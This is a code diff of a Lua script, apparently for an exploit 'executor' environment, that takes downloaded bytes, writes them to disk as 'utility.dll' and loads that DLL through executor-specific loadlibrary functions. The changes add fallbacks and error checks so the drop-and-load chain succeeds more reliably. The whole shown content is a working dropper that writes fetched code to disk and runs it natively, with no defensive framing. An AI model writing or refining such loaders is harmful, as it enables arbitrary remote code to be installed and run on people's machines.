@@ -19,25 +19,38 @@ if not ok or type(bytes) ~= "string" or #bytes < 1024 then
 end
 print("[+] Downloaded: " .. #bytes .. " bytes")
 
--- 2. Write to disk
-local f, err = io.open(DLL_PATH, "wb")
-if not f then
-    -- Fall back to the executor's writefile if io is sandboxed
-    if writefile then
-        writefile(DLL_PATH, bytes)
+-- 2. Write to disk (try io.open first, fall back to executor's writefile)
+local wrote = false
+if io and io.open then
+    local f, err = io.open(DLL_PATH, "wb")
+    if f then
+        f:write(bytes)
+        f:close()
+        wrote = true
+        print("[+] utility.dll written via io.open: " .. DLL_PATH)
+    end
+end
+if not wrote and writefile then
+    local ok, err = pcall(writefile, DLL_PATH, bytes)
+    if ok then
+        wrote = true
         print("[+] utility.dll written via writefile()")
     else
-        print("[!] Could not open file for writing: " .. tostring(err))
-        return
+        print("[!] writefile failed: " .. tostring(err))
     end
-else
-    f:write(bytes)
-    f:close()
-    print("[+] utility.dll written: " .. DLL_PATH)
+end
+if not wrote then
+    print("[!] No file-write API exposed (io and writefile both nil or failed)")
+    return
 end
 
 -- 3. Load the DLL (executor-specific function)
-local d = (load_dll or loadlibrary)(DLL_PATH)
+local load_dll_fn = load_dll or loadlibrary
+if not load_dll_fn then
+    print("[!] No loadlibrary API exposed (load_dll and loadlibrary both nil)")
+    return
+end
+local d = load_dll_fn(DLL_PATH)
 if not d then
     print("[!] load_dll returned nil")
     return
